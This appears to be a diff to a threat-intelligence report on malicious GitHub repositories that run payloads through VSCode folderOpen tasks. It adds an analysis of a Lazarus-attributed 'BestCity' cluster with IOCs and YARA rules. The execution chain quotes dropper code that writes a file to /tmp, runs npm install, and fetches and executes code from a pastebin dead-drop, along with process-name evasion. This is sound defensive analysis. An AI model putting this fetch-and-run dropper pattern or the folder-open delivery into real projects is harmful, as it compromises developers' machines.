@@ -1,7 +1,22 @@
-# PolinRider — C2 Infrastructure Overview
+# Malicious Repository Campaign — C2 Infrastructure Overview
 
-*Cross-campaign synthesis of wallets, IPs, XOR keys, and routing logic*  
-*Last updated: 2026-06-28 — all data derived from Tasks A–O*
+*Two distinct actor clusters sharing the VSCode `folderOpen` delivery vector*  
+*Last updated: 2026-06-29 — Tasks A–AC*
+
+---
+
+## Cluster Summary
+
+| Cluster | Attribution | C2 mechanism | Status |
+|---------|-------------|--------------|--------|
+| **PolinRider / TRON blockchain** | Unknown (advanced, persistent) | TRON wallet → BSC tx → XOR → JS | Active |
+| **BestCity / Contagious Interview** | Lazarus / Famous Chollima (high confidence) | HTTPS dead-drop (jsonkeeper.com) | C2 dead |
+
+---
+
+---
+
+## Cluster 1: PolinRider / TRON Blockchain Campaign
 
 ---
 
@@ -213,3 +228,142 @@ rule PolinRider_XOR_Keys {
         any of them
 }
 ```
+
+---
+
+## Cluster 2: BestCity / Contagious Interview Campaign
+
+**See also:** `ANALYSIS_AC_BESTCITY_CLUSTER.md` for full decode.
+
+**Attribution:** Lazarus Group / Famous Chollima sub-cluster ("Contagious Interview") — high
+confidence based on delivery vector, multi-layer WJS obfuscation with tamper detection,
+fabricated git history with fake personas, and fake job-offer pretext. **No shared IOCs with
+PolinRider.** These are independent actors using the same VSCode `folderOpen` delivery vector.
+
+---
+
+### Repos
+
+| Repo | Account created | Payload | Size | Type |
+|------|----------------|---------|------|------|
+| `technoknol/bestcity` | 2014 (victim) | `public/fontawesome/fa-solid-400.woff2` | 55,985 B | 3-layer WJS IIFE |
+| `AbstractFruitFactory/bestcity-demo` | 2014 (victim) | `public/fontawesome/fa-solid-400.woff2` | 55,985 B | 3-layer WJS IIFE (byte-identical) |
+| `fullstackragab/bestcity` | 2021 (victim) | `webfonts/fa-brands-regular.woff2` | 9,357 B | obfuscator.io |
+| `BestCity-v1/Demo-v1` | 2025-12-22 (**actor**) | `webfonts/fa-brands-regular.woff2` | 147,449 B | obfuscator.io |
+
+`technoknol` and `AbstractFruitFactory` are real developer accounts co-opted as bait.
+`BestCity-v1` is actor-created (3 days before first commit, no profile, single payload repo).
+`fullstackragab` and `BestCity-v1/Demo-v1` share an identical 100-commit LLM-generated history.
+
+---
+
+### Execution Chain
+
+```
+Victim opens repo in VSCode
+  │
+  └─ tasks.json folderOpen → node ./public/fontawesome/fa-solid-400.woff2
+       │
+       └─ Layer 1 (55,985 B WJS IIFE)
+            TZ8C: rolling XOR hash of Qm9K.toString() → decryption key
+            DHlD: XOR-decrypt URL-encoded payload with key
+            (tamper detection: source change → wrong key → SyntaxError)
+            │
+            └─ Layer 2 (19,016 B, decrypted)
+                 Sets up dnQo string table; executes Layer 3
+                 │
+                 └─ Layer 3 dropper (plaintext)
+                      fs.writeFileSync('/tmp/programx64/main.js', dropper_code)
+                      execSync('cd "/tmp/programx64" && npm install axios && node main.js')
+                      │
+                      └─ main.js (written to disk)
+                           process.title = 'Node.js JavaScript Runtime'  ← evasion
+                           axios.get(atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi84NVFHSA=='))
+                           → https://www.jsonkeeper.com/b/85QGH  [DEAD — 404]
+                           new (Function.constructor)('require', res.data.model)(require)
+```
+
+---
+
+### C2 Architecture
+
+| Element | Value |
+|---------|-------|
+| Dead-drop | `https://www.jsonkeeper.com/b/85QGH` (public JSON pastebin) |
+| Dead-drop status | **DEAD** — 404 as of 2026-06-29 |
+| Stage fetch field | `res.data.model` |
+| Execution method | `new (Function.constructor)('require', payload)(require)` |
+| Temp path | `/tmp/programx64/main.js` |
+| npm deps silently installed | `axios`, `request` |
+| Process evasion | `process.title = 'Node.js JavaScript Runtime'` |
+
+---
+
+### IOCs
+
+| Type | Value |
+|------|-------|
+| C2 URL | `https://www.jsonkeeper.com/b/85QGH` |
+| Temp dropper path | `/tmp/programx64/main.js` |
+| Process title | `Node.js JavaScript Runtime` |
+| Actor account | `BestCity-v1` (GitHub, created 2025-12-22) |
+| Actor commit email | `forbesmike200@gmail.com` (technoknol repo) |
+| Actor commit email | `williamherr8@gmail.com` (AbstractFruitFactory initial) |
+| Actor commit email | `alexander.wormbs@gmail.com` (AbstractFruitFactory subsequent) |
+| Fake persona email | `nicolasmelo12@gmail.com` |
+| Fake persona email | `myselfmail0301@gmail.com` |
+| Fake persona email | `Fiddlekins@gmail.com` |
+| Fake persona email | `sbegaa@gmail.com` |
+
+---
+
+### Detection Signatures
+
+```
+# Filesystem (host)
+/tmp/programx64/main.js  ← dropper staging path
+
+# Process (host)
+process.title == 'Node.js JavaScript Runtime'  ← masquerading node process
+
+# Network (dead but signature still useful for historical detection)
+GET https://www.jsonkeeper.com/b/85QGH
+
+# YARA (host — WJS tamper-detection pattern)
+rule BestCity_WJS_TamperDetect {
+    strings:
+        $tz8c  = "function TZ8C" ascii
+        $dhlD  = "function DHlD" ascii
+        $qm9k  = "function Qm9K" ascii
+        $tpath = "/tmp/programx64" ascii
+    condition:
+        2 of them
+}
+
+rule BestCity_Dropper {
+    strings:
+        $path  = "/tmp/programx64/main.js" ascii
+        $ptit  = "Node.js JavaScript Runtime" ascii
+        $c2    = "jsonkeeper.com/b/85QGH" ascii
+    condition:
+        any of them
+}
+```
+
+---
+
+### Cluster Comparison
+
+| Property | PolinRider / TRON | BestCity / Contagious Interview |
+|----------|-------------------|--------------------------------|
+| Attribution | Unknown (advanced persistent) | Lazarus / Famous Chollima |
+| Delivery vector | VSCode `folderOpen` / npm packages | VSCode `folderOpen` |
+| C2 mechanism | TRON wallet → BSC blockchain → XOR | HTTPS GET to jsonkeeper.com pastebin |
+| Blockchain | TRON + Aptos + BSC | None |
+| Obfuscation | Custom XOR shuffle cipher (`sfL`, `_$_xxxx`) | WJS IIFE with self-keying XOR tamper detection |
+| Persistence | Detached `child_process.spawn` | npm install + `node main.js` |
+| Stage delivery | 2+ on-chain dead-drops | 1 HTTP dead-drop (dead) |
+| Fake git history | No | Yes — 100-commit LLM-generated, 4 personas |
+| Pretext | Infected developer repos | Fake job interview |
+| C2 status | Active (as of 2026-06-29) | Dead (404) |
+| Shared IOCs | — | None with PolinRider |
